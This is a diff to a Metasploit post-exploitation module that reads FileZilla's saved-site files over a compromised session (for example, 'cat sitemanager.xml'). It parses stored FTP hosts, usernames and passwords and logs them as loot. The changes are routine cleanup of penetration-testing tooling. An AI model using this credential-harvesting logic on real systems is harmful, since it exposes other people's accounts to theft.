@@ -34,6 +34,11 @@ class MetasploitModule < Msf::Post
               stdapi_sys_config_getuid
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
         }
       )
     )
@@ -151,15 +156,15 @@ class MetasploitModule < Msf::Post
 
     paths.each do |path|
       print_status("Reading sitemanager.xml and recentservers.xml files from #{path}")
+
+      # @todo use File.read_file
       if session.type == 'shell'
-        type = :shell
         sites = session.shell_command("cat #{path}/sitemanager.xml")
         recents = session.shell_command("cat #{path}/recentservers.xml")
         print_status("recents: #{recents}")
         creds = [parse_accounts(sites)]
         creds << parse_accounts(recents) unless recents =~ /No such file/i
       else
-        type = :meterp
         sitexml = "#{path}\\sitemanager.xml"
         present = begin
           session.fs.file.stat(sitexml)
@@ -192,14 +197,9 @@ class MetasploitModule < Msf::Post
           print_status('No recent connections where found.')
         end
       end
+
       creds.each do |cred|
         cred.each do |loot|
-          if session.db_record
-            source_id = session.db_record.id
-          else
-            source_id = nil
-          end
-
           report_cred(
             ip: loot['host'],
             port: loot['port'],
@@ -286,12 +286,13 @@ class MetasploitModule < Msf::Post
       creds << account
 
       print_status('    Collected the following credentials:')
-      print_status('    Server: %s:%s' % [account['host'], account['port']])
-      print_status('    Protocol: %s' % account['protocol'])
-      print_status('    Username: %s' % account['user'])
-      print_status('    Password: %s' % account['password'])
-      print_line('')
+      print_status("    Server: #{account['host']}:#{account['port']}")
+      print_status("    Protocol: #{account['protocol']}")
+      print_status("    Username: #{account['user']}")
+      print_status("    Password: #{account['password']}")
+      print_line
     end
+
     return creds
   end
 
